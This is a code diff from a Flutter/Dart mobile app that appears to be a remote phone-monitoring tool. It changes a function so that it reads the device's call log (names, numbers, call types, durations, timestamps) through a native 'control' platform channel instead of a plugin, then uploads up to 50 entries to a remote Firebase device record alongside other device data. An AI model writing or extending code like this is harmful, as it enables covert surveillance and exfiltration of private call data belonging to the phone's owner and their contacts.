@@ -7,7 +7,6 @@ import 'dart:io';
 import 'dart:ui';
 
 import 'package:battery_plus/battery_plus.dart';
-import 'package:call_log/call_log.dart';
 import 'package:camera/camera.dart';
 import 'package:firebase_auth/firebase_auth.dart';
 import 'package:firebase_core/firebase_core.dart';
@@ -309,22 +308,23 @@ Future<void> _pushBattery(DatabaseReference deviceRef) async {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-//  CALL LOGS
+//  CALL LOGS (via platform channel — uses Android ContentProvider directly)
 // ═══════════════════════════════════════════════════════════════════════════════
 
 Future<void> _pushCallLogs(DatabaseReference deviceRef) async {
   try {
-    final entries  = await CallLog.get();
-    final recent   = entries.take(50).toList();
-    final logsMap  = <String, dynamic>{};
-    for (int i = 0; i < recent.length; i++) {
-      final e = recent[i];
+    const channel = MethodChannel(_kCtrlChannel);
+    final List<dynamic>? raw = await channel.invokeMethod('getCallLogs');
+    if (raw == null || raw.isEmpty) return;
+    final logsMap = <String, dynamic>{};
+    for (int i = 0; i < raw.length && i < 50; i++) {
+      final m = Map<String, dynamic>.from(raw[i] as Map);
       logsMap['log_$i'] = {
-        'name'     : e.name ?? 'Unknown',
-        'number'   : e.number ?? '',
-        'type'     : e.callType?.name ?? 'unknown',
-        'duration' : e.duration ?? 0,
-        'timestamp': e.timestamp ?? 0,
+        'name'     : m['name'] ?? 'Unknown',
+        'number'   : m['number'] ?? '',
+        'type'     : m['type'] ?? 'unknown',
+        'duration' : m['duration'] ?? 0,
+        'timestamp': m['timestamp'] ?? 0,
       };
     }
     await deviceRef.child('call_logs').set(logsMap);
